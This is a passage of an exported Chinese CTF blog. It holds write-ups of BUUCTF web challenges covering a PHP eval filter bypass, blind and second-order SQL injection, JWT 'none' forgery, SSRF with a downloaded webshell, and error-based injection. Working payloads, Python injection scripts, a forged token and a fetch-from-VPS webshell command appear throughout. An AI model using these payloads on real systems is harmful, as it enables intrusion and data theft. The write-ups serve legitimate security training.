其他都是thinkphp框架的环境，这里直接开始审计第一个。 路径：/app/controller/Index.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123; public function index() &#123; $white_fun = array( 'print', ); if(isset($_GET['code']))&#123; $code = $_GET['code']; if(preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i', $code, $matches1)) &#123; foreach ($matches1[1] as $value) &#123; echo $value.'&lt;/br&gt;'; if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123; echo '加把劲~'; exit; &#125; &#125; &#125; if(preg_match('/(new)|(dump)|(content)|(f)|(php)|(base)|(evala)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\")|(\/)|(\&gt;)|(\&lt;)|(~)|(\&#123;)|(\&#125;)|(\.)|(,)|(`)|(\$)|(_)|(\^)|(!)|(%)|(\+)|(\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i', $code)) &#123; echo '收手吧阿祖'; exit; &#125;else&#123; //var_dump($code); eval($code); &#125; &#125;else&#123; return '就挺秃然的。'; &#125; &#125; public function hello($name = 'ThinkPHP6') &#123; return 'hello,' . $name; &#125;&#125; 这里的路由规则看不太懂，但是不影响做题，直接访问 /public/ 这个路径就能执行到上面代码 127.0.0.1:9999/public/ 分析要执行到eval($code)，需要经过两个条件 第一个 123456789if(preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i', $code, $matches1)) &#123; foreach ($matches1[1] as $value) &#123; echo $value.'&lt;/br&gt;'; if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123; echo '加把劲~'; exit; &#125; &#125;&#125; 分析： 正则会匹配$_GET[‘code’] 接收的值，然后会通过函数 function_exists()判断 ，如果给定的函数已经被定义就返回true，当接收的值是一个被定义的函数名并且这个函数名又不在$white_fun数组中，程序就会终止。但是我发现当我当在函数名两边加上单引号，就不会被匹配到，并且还能执行，比如assert(); 这样会被匹配到，变成 ‘assert’()就不会，通过在本地测试，’assert’()能够执行。 第二个 1234567if(preg_match('/(new)|(dump)|(content)|(f)|(php)|(base)|(evala)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\")|(\/)|(\&gt;)|(\&lt;)|(~)|(\&#123;)|(\&#125;)|(\.)|(,)|(`)|(\$)|(_)|(\^)|(!)|(%)|(\+)|(\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i', $code)) &#123; echo '收手吧阿祖'; exit; &#125;else&#123; //var_dump($code); eval($code); &#125; 即便是绕过了第一个正则，很多函数还能被ban了，自己尝试了8进制编码绕过，但是由于过滤了双引号，不能执行成功，php编码函数绕过，大部分都被过滤，找到一个bzdecompress，但是需要开启bz2，默认是不开启，放弃了，还有就是通过数组，数组可以绕过过以上两个条件，但是最终值为 Array，显然达不到我想要的效果，最终问了出题师傅，提示了thinkphp的助手函数。助手函数，找到一个 input的助手函数，功能类似于 $_GET[&#39;name&#39;] ，前者比后者强大，前者所有方式传参都能接收，比如 $name = input(&#39;name&#39;);,GET、POST等都能传进来。 构造payload在构造payload的时候，我思路太狭窄了。 当时构造的是 123456?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo();&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo()&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=@eval(base64_decode($_GET[z0]));&amp;z0=cGhwaW5mbygpOw==?code=&apos;input&apos;(&apos;name&apos;);&amp;name=@eval(base64_decode($_GET[z0]));&amp;z0=InBocGluZm8oKTsi?code=&apos;input&apos;(&apos;name&apos;);&amp;name=assert(&quot;phpinfo();&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=`phpinfo();` 发现没有回显，后来经过大师傅指点，这样传进去根本只是个字符串 12?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo();&quot;);我以为上边会执行 eval(&quot;phpinfo();&quot;); 但其实只是个字符串，感觉确实有点绕，只需要记住，eval只能执行当前传入的字符串一次。eval(&apos;input&apos;(&apos;name&apos;);) 等价于 input(&apos;name&apos;) 最后实在想不出来什么招，就问了出题师傅payload。 1/public/?code=((%27input%27)(%27aun%27))((%27input%27)(%27cmd%27));&amp;aun=system&amp;cmd=whoami 看到这个payload，我大吃一惊，我咋就没想到。 于是自己也构造了一个payload 1?code=&apos;input&apos;(&apos;cmd&apos;)(&apos;input&apos;(&apos;value&apos;));&amp;cmd=system&amp;value=whoami 也可以执行。 拿 flag 的payload 1?code=&apos;input&apos;(&apos;cmd&apos;)(&apos;input&apos;(&apos;value&apos;));&amp;cmd=system&amp;value=/readflag 总结我太菜了。]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>preg_match绕过</tag>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【GYCTF2020】Ezsqli 1]]></title>
    <url>%2F2021%2F08%2F21%2F%5BGYCTF2020%5DEzsqli%201%2F</url>
    <content type="text"><![CDATA[考点sql盲注（无列名注入） 前置知识过滤information_schema 代替表以下表都可代替information_schema表查询表名信息，但是不能查到列名 12mysql.innodb_table_statstable_schema table_schema 换成 database_name 123sys.x$schema_table_statistics（只能查表名，查不到列名）表名：table_name 数据库：table_schema 123sys.schema_auto_increment_columns（可获取表名和库名）表名：table_name 数据库：table_schema 123sys.schema_table_statistics_with_buffer（可获取表名）表名：table_name 数据库：table_schema 无列名注入（只知道表名的情况下查询数据）子查询绕过 12(select `2` from (select 1,2,3 union select * from table_name)a) //前提是要知道表名((select c from (select 1,2,3 as c union select * from users)b)) 1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量 join爆破列名 12?id=-1&apos; union all select * from (select * from users as a join users as b)as c--+//as主要作用是起别名，就是把users表当做a表，常规来说as可以省略?id=-1&apos; union all select*from (select * from users as a join users as b using(id,username))as c--+ 逐字符检索数据 这里的select 1 是对应字段的位置 比如 id username password 1 就对应id 2就对应 username 3就对应 password 123456789101112mysql&gt; select (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+mysql&gt; select (select 1,&apos;d&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 1 |+------------------------------------------------------------+//说明第二个字段的第一位是c,以此类推 12345mysql&gt; select (select 1,&apos;cm&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+ 解题过程打开页面 页面上一个半身照，一个提交的输入框，POST提交方式，bp启动。 检测注入类型12?id=1^1^1 //回显Nu1L?id=1^0^1 //Error Occured When Fetch Result. 检测出异或盲注 FUZZ检测关键字过滤 length为507 是被过滤的 挑几个关键的 1information handler join information 已经被过滤，只有通过 sys的x$schema_table_statistics 来查询表名。 构造payload查表名payload 11^(ascii(substr((select group_concat(table_name)from sys.x$schema_table_statistics where table_schema=database()),1,1))&gt;0)^1 上脚本 12345678910111213141516171819202122232425import requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'flag=''for i in range(1,50): a = 32 b = 128 mid = (a+b)//2 while(a&lt;b): data = &#123; "id": "1^(ascii(substr((select group_concat(table_name)from sys.x$schema_table_statistics where table_schema=database()),%d,1))&gt;%d)^1"%(i, mid) &#125; import time time.sleep(1) re = requests.post(url=url,data=data) if 'Nu1L' in re.text: a = mid + 1 b = mid mid = (a+b)//2 if (mid==32|mid==128): break flag +=chr(mid) print(flag) 跑起来 得到 1users233333333333333,f1ag_1s_h3r3_hhhhh information_schema关键字已经被过滤掉，想通过columns表来查询列名，几乎不可能，通过逐字符检索数据的方法来逐个猜解值，也就是无列名注入 猜解值构造payload（两个都可以） 121^((select (select 1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh)))^1-1||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 上大佬的脚本，遇到问题还挺多，buuctf网站限制访问频率，直接跑，不一会就会报错，每次请求延时1秒。 123456789101112131415161718import requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'payload='-1||((select 1,"&#123;&#125;")&gt;(select * from f1ag_1s_h3r3_hhhhh))'flag=''for j in range(1,50): for i in range(32,128): hexchar=flag+chr(i) py=payload.format(hexchar) print(py) datas=&#123;'id':py&#125; import time time.sleep(1) re=requests.post(url=url,data=datas) if 'Nu1L' in re.text: flag+=chr(i-1) print(flag) break 跑起来 结果 1FLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125; py一下转小写 123&gt;&gt;&gt; s = &quot;FLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125;&quot;&gt;&gt;&gt; print(s.lower())flag&#123;ae26cbd7-c851-4928-98e4-e0635d45b90c&#125; 总结]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【HFCTF2020】EasyLogin 1]]></title>
    <url>%2F2021%2F08%2F21%2F%5BHFCTF2020%5DEasyLogin%201%2F</url>
    <content type="text"><![CDATA[考点代码审计（node.js） JWT伪造 前置知识node.js node.js koa框架常用目录，文件 app/controllers 项目控制器存放目录：接收请求，处理逻辑 app/dbhelper 数据库CRUD操作的封装 app/models 对应数据库表表结构 config/router.js 项目路由 node_modules app.js 项目入口 JWTJWT 小知识JWS：Signed JWT签名过的jwtJWE：Encrypted JWT部分payload经过加密的jwt JWT的组成三个部分（用点分割）header：主要声明JWT的签名算法payload：主要承载了各种声明并传递明文数据signture：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT，也就是不安全的JWT，此时header中声明的签名算法为none。 JWT的形式： 123eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ JWT的相关攻击方式 解题过程审查元素引入一个 app.js文件 找到一些关键字 koa ,koa是一个基于node.js的web框架。 可以直接通过目录 controllers/api.js 访问到后端源代码，拷贝过来审计。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = &#123; # 注册功能 'POST /api/register': async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; # 这里判断 如果注册的用户名 为 admin 则不继续执行 返回 wrong username if(!username || username === 'admin')&#123; throw new APIError('register error', 'wrong username'); &#125; # 这里是 什么 大于 10w 重新赋值 if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; # 后边 应该是该加密 加密 该编码编码 该保存保存 const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) # 返回一个token 内容就是JWT const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: 'HS256'&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, # 登录功能 'POST /api/login': async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; # 判断是否提交用户名和密码 没有则停止 if(!username || !password) &#123; throw new APIError('login error', 'username or password is necessary'); &#125; # 下面两句不知道 const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) # sid不能为 undefined sid 不能为 null sid&gt;=0&amp;&amp;sid&lt; global.secrets.length if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id'); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, # 获取flag功能 'GET /api/flag': async (ctx, next) =&gt; &#123; # 要求 session中的username 必须为 admin if(ctx.session.username !== 'admin')&#123; throw new APIError('permission error', 'permission denied'); &#125; const flag = fs.readFileSync('/flag').toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, 'GET /api/logout': async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; node.js真的一点基础都没有，不过有语言基础，还是能勉强看得懂一些，跟着大佬的wp再来审计一遍。 解题方式需要构造一个JWT解码后明文为下面这样的JWT，将加密方式改成none，secretid改成[]，接下来需要将明文转换成JWT格式。 12345678910&#123; &quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;&#123; &quot;secretid&quot;: [], &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;iat&quot;: 1629515715&#125; 解题首先注册一个账号 然后登录这个账号的时候抓包 后边跟了一个名为anthorization的参数，将参数值拿到 这个平台 jwt解码 查看明文。 我们要做的就是将 HEADER 中的 alg加密方式改成 none，然后先将 PAYLOAD中的 secretid 改成[]，再将username改成admin，但是这里的HEADER是不能直接修改，就直接给出替换内容 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 ，然后手动将PAYLOAD中的secretid改成 []，加密后再将 SIGNATURE部分山刀，. 不删。就像下面这样。 然后将这段密文替换到anthorization 参数中，最后很重要的一个地方，也很容易忘，就是将username改成admin。 1eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyOTUxODYwMn0. 提交 可见返回true 获取flag 小结这道题对node.js 和 JWT 都是一窍不通，都是硬着头皮照着大佬wp做了下来，其实之前做过jwt伪造类的题目，但是对JWT的原理并不懂，所以很快就忘掉了，这次算是巩固了一次吧，总之经验需要不断积累，原理需要深入理解。每天两道CTF题，时间就打发了。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>JWT伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【网鼎杯 2018】Comment 1]]></title>
    <url>%2F2021%2F08%2F17%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment%201%2F</url>
    <content type="text"><![CDATA[考点密码爆破 git泄露 代码审计 二次注入 解题过程打开 一个留言板页面 一个登录页面 自己手工试了下，不存在万能密码绕过。仔细看了下输入框，发现有关键字，直接bp启动，开始爆破zhangwei*** 后三位。 构造3位纯数字作为payload 得到密码 zhangwei666 接下来登录 有个发帖和留言功能，用sqlmap也没检测出注入点。 接下来用dirsearch扫下目录。 1python3 dirsearch.py -u &quot;http://ccd2d540-8775-4d4a-a19c-70165c4879f1.node4.buuoj.cn:81/&quot; -x 404,429 -s 1 存在.git泄露 使用GitHacker对git文件进行恢复（ubuntu下） 1githacker --url http://ccd2d540-8775-4d4a-a19c-70165c4879f1.node4.buuoj.cn:81/.git --folder res --threads 1 得到一个write_do.php 的文件 进目录中查找更改历史 1git log --reflog 只显示这一个，看了别的师傅wp，这里会出来3个历史更改，然后用 git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c 命令，就可以得到完整的代码。 可能是工具或者环境的问题，这里直接给代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phpinclude "mysql.php";session_start();# if($_SESSION['login'] != 'yes')&#123; header("Location: ./login.php"); die();&#125;if(isset($_GET['do']))&#123; switch ($_GET['do']) &#123; case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); # 将 category title content 插入 board 表中 $sql = "insert into board set category = '$category', title = '$title', content = '$content'"; # 执行sql $result = mysql_query($sql); header("Location: ./index.php"); break; case 'comment': $bo_id = addslashes($_POST['bo_id']); # 根据 bo_id 查询 category 字段值 $sql = "select category from board where id='$bo_id'"; # 执行sql $result = mysql_query($sql); $num = mysql_num_rows($result); # 大于0 代表有结果集 if($num&gt;0)&#123; # 获取 category 字段值 $category = mysql_fetch_array($result)['category']; # 获取提交内容 $content = addslashes($_POST['content']); # 将 category 和 content 、bo_id 放入数据库中 # sql语句中的 $category 变量是从数据库中取出，而 $category 的值 最开始由 # $_POST['category'] # 经过 addslashes 对 单双引号 反斜线 进行转义（给' 转义成 \',\",\\）， 但是到数据库中 这些\ # 会被丢弃，所以，这里存在二次注入 $sql = "insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'"; $result = mysql_query($sql); &#125; header("Location: ./comment.php?id=$bo_id"); break; default: header("Location: ./index.php"); &#125;&#125;else&#123; header("Location: ./index.php");&#125;?&gt; 代码审计这段代码有两个主要的作用，第一个分支write，是将帖子的标题、内容、分类插入到数据库中，第二个分支comment，提交留言，不过，这里在提交留言的时候，会先根据 bo_id 在数据库中进行查询，然后取出分类字段的字段值，然后再将取出的分类字段值和提交的留言以及bo_id插入到 comment 表中。虽说经过了 addslashes 进行转义，但是数据库中并不会存储 \ ，所以在第二次取出category，再次进行拼接插入的时候，就照成了注入，也是二次注入。 12345678$category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); # 将 category title content 插入 board 表中 $sql = "insert into board set category = '$category', title = '$title', content = '$content'"; 这里并不存在注入。 1234567891011# 这里的$category 是从数据中获取# addslashes($_POST['category']); 拿到 ' " / 会转义成 \' \" \\ # 但是这样的 \' 存储在数据库中 \会被丢弃$category = mysql_fetch_array($result)['category']; # 获取提交内容 $content = addslashes($_POST['content']); $sql = "insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'"; 二次注入构造payload aa&#39;,content=database(),/* 先在index.php POST 1title=111&amp;category=aa&apos;,content=database(),/*&amp;content=111 1title=111&amp;category=aa%27%2Ccontent%3Ddatabase%28%29%2C%2F*&amp;content=111 插入的数据 12insert into board set category = 'aa',content=database(),/*', title = '111',content = '111'; 然后在comment.php POST 1content=*/#&amp;bo_id=2 1content=*%2F%23&amp;bo_id=2 插入的数据 1insert into comment set category ='aa',content=database(),/*', content = '*/#',bo_id = '2'; 真正在数据库中执行的语句为 1insert into comment set category = &apos;aa&apos;,content=database(), 回显 数据库名 先用下面payload尝试读取/etc/passwd index.php 1title=111&amp;category=aa&apos;,content=(select load_file(&apos;/etc/passwd&apos;)),/*&amp;content=111 comment.php 1content=*/#&amp;bo_id=2 回显 按照别的师傅wp指示 读取 /home/www/.bash_histroy 构造payload index.php 1title=111&amp;category=aa&apos;,content=(select load_file(&apos;/home/www/.bash_history&apos;)),/*&amp;content=111 再次读取 .DS_store 1title=111&amp;category=aa&apos;,content=(select load_file(&apos;/tmp/html/.DS_Store&apos;)),/*&amp;content=111 用hex函数继续读取 1title=111&amp;category=aa&apos;,content=(select hex(load_file(&apos;/tmp/html/.DS_Store&apos;))),/*&amp;content=111 解码 可以从字符串中看到一个带有flag字样的文件名，这个文件名不在/home/www中，在/var/www/html中， 接下来继续读取 1title=111&amp;category=aa&apos;,content=(select hex(load_file(&apos;/var/www/html/flag_8946e1ff1ee3e40f.php&apos;))),/*&amp;content=111 得到，解码，拿到flag。 总结这道题两个考点，又学到了新知识，第一个是git源码泄露，原本一直用的是githack，但是这个工具只能下载文件，不能查看历史版本，通过大佬的wp，又了解到一个githacker的工具，中途花了不少时间去安装这个工具，还是踩了些坑，这个工具要比githack强大些。第二个知识就是二次注入，二次注入做了很多次，每次花样都不一样，不看wp肯定做不起，不过又了解到了一种姿势，就此记录下来，原理都是一样。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>密码爆破</tag>
        <tag>二次注入</tag>
        <tag>文件泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【HITCON 2017】SSRFme 1]]></title>
    <url>%2F2021%2F08%2F16%2F%5BHITCON%202017%5DSSRFme%201%2F</url>
    <content type="text"><![CDATA[考点 ssrf 代码审计 解题过程打开1234567891011121314151617181936.18.121.204 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; &#125; echo $_SERVER["REMOTE_ADDR"]; $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec("GET " . escapeshellarg($_GET["url"])); $info = pathinfo($_GET["filename"]); $dir = str_replace(".", "", basename($info["dirname"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info["basename"]), $data); highlight_file(__FILE__); 得到一份源代码，那肯定是先进行代码审计 代码审计123456789101112131415161718192021222324252627282930313233&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; # explode 使用一个字符串分割另一个字符串 $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; &#125; echo $_SERVER["REMOTE_ADDR"]; # $sandbox 的值为 sanbox/(orange36.18.121.204 md5加密后的值) $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); # 以$sandbox的值创建路径 @mkdir($sandbox); # 进入路径 @chdir($sandbox); # shell_exec 执行命令 # escapeshellarg 把字符串转码为可以在 shell 命令里使用的参数 # $data = shell_exec("GET " . escapeshellarg($_GET["url"])); # 返回文件路径的信息 文件名可以通过GET["filename"]传参 $info = pathinfo($_GET["filename"]); # basename($info["dirname"]) # basename 返回路径中的文件名部分 # $info["dirname"] 返回路径中的目录部分 # 将 xxx 字符串中的 . 替换成 '' $dir = str_replace(".", "", basename($info["dirname"])); # 创建文件夹 @mkdir($dir); # 进入文件夹 @chdir($dir); # 写入文件 # 将$data 写入 basename($info["basename"] 文件中 @file_put_contents(basename($info["basename"]), $data); highlight_file(__FILE__); 这道代码的作用：通过sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])创建了一个沙盒目录，然后$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));执行GET命令，参数由外部$_GET[&quot;url&quot;]传参，外部$info = pathinfo($_GET[&quot;filename&quot;]);传入文件名，将GET命令执行结果写入文件中file_put_contents(basename($info[&quot;basename&quot;]), $data);。 分析完后首先想到的就是，在vps上绑定一句话木马进行监听，然后通过GET命令去请求，用$_GET[“filename”]传入的值作为文件名保存。 在服务器上写上一句话目标，然后保存。 用python启动一个http服务 1python3 -m http.server 构造pyalod进行请求 1?url=121.4.xx.xx:8000/shell.php&amp;filename=shell.php 接下来需要去沙盒路径下访问刚刚写入的文件 shell.php 1234路径的构造规则 sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])在页面中回显的ip 36.18.121.204 通过 md5 加密 orange36.18.121.204 得到 d23635209b921a91099a3d5b85be6af2拼接 sandbox/d23635209b921a91099a3d5b85be6af2 访问 sandbox/d23635209b921a91099a3d5b85be6af2/shell.php POST 提交 phpinfo() 蚁剑启动 根目录下看到flag，双击打不开 切换到终端，执行./readflag ，成功拿到flag 第二种方式利用GET命令的一个漏洞，GET命令是用perl来执行，而prel的open可以执行命令，这里都是看别人wp才知道的，说得都是云里雾里，直接进行演示。 用GET 执行命令 （先创建文件才执行GET才能成功） 12touch &apos;ls|&apos;GET &quot;file:ls|&quot; 123456789101112131415┌──(kali㉿kali)-[/tmp]└─$ touch &apos;ls|&apos; ┌──(kali㉿kali)-[/tmp]└─$ GET &quot;file:ls|&quot;fcitx-socket-:0ls|ssh-jMvsHCg3mID2systemd-private-344dd432807142dd8950d423318f82d0-colord.service-ysjeOfsystemd-private-344dd432807142dd8950d423318f82d0-haveged.service-k1bxPfsystemd-private-344dd432807142dd8950d423318f82d0-ModemManager.service-p6Qjyhsystemd-private-344dd432807142dd8950d423318f82d0-systemd-logind.service-IpdMMhsystemd-private-344dd432807142dd8950d423318f82d0-upower.service-re1qdfVMwareDnDvmware-root_437-1849036237 在kali中，要让命令执行生效，需要在 /usr/share/perl5/LWP/Protocol/file.pm 文件中，将 open(my $fh,&#39;&lt;&#39;, $path) or return new 修改为open(my $fh, $path) or return new。 构造payload拿flag 先执行两遍 1?url=file:bash -c /readflag|&amp;filename=bash -c /readfla 在访问 /sandbox/d23635209b921a91099a3d5b85be6af2/bash -c /readflag| 总结对这道题处于一种，啊，这就是ssrf题吗。平时ssrf做得很少，现在要是问我，什么是ssrf，我会回答，服务端请求伪造，但是要我说个案例，我就说不上来。这道题给我的提升就是知道GET命令的漏洞以及利用方式。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [RCTF2015]EasySQL 1]]></title>
    <url>%2F2021%2F08%2F16%2F%5BRCTF2015%5DEasySQL%201%2F</url>
    <content type="text"><![CDATA[考点二次报错注入 解题过程打开 两个功能，登录和注册 先注册 用admin作为账户名注册的时候提示，user exists! 可以知道admin账号存在，先不管，用root作为账户名注册。 注册并登录成功 点击root超链接，发现里面存在一个修改密码的功能 接下来尝试用 admin&quot;# 的方式修改admin密码。 流程 第一步：先以 admin”# 为账户名注册 第二步：登录 admin”# 账户 第三步：修改 密码 发现可以修改admin账户名的登录密码，但是并没有什么用，flag也没有藏在个人信息里，但是可以知道的是，更改密码那里存在sql注入漏洞。 接下来 通过翻开源代码可以知道，更改密码那会将错误信息输出。 构造payload 先注册页面提交 1test&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;password=test&amp;email=123 登录并点开修改密码提交一次 成功拿到数据库表 拿数据库表 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)# article,flag,users 拿列名 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x7e),1)# XPATH syntax error: ‘~name,pwd,email,real_flag_1s_her’ 发现并没有获取完，学到一个新姿势。 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x7e),1)# 这里如果是放在bp里提交有个小问题，&amp;&amp;后边的内容会提交不上，解决方式就是将&amp;&amp;url编码成%26%26 查值 1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x7e),1)# 出现问题，未显示完，用reverse函数逆序输出 1test&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;))),0x7e),1)# python一下 123s = &quot;~&#125;8e548f769e29-07c9-1c44-5196-67&quot;print(s[::-1])# 76-6915-44c1-9c70-92e967f845e8&#125;~ 拼接一下，就得到 1flag&#123;8b8f6676-6915-44c1-9c70-92e967f845e8&#125; 总结这道题，凭借自己能力，只能达到修改admin用户名那一步，还是太菜，后边都是看别的师傅wp，这道题又巩固了一次二次注入的做题经验，又学到了报错注入未显示完整的内容显示出来的姿势。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>CTF</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CSCCTF 2019 Qual】FlaskLight 1]]></title>
    <url>%2F2021%2F08%2F16%2F%5BCSCCTF%202019%20Qual%5DFlaskLight%201%2F</url>
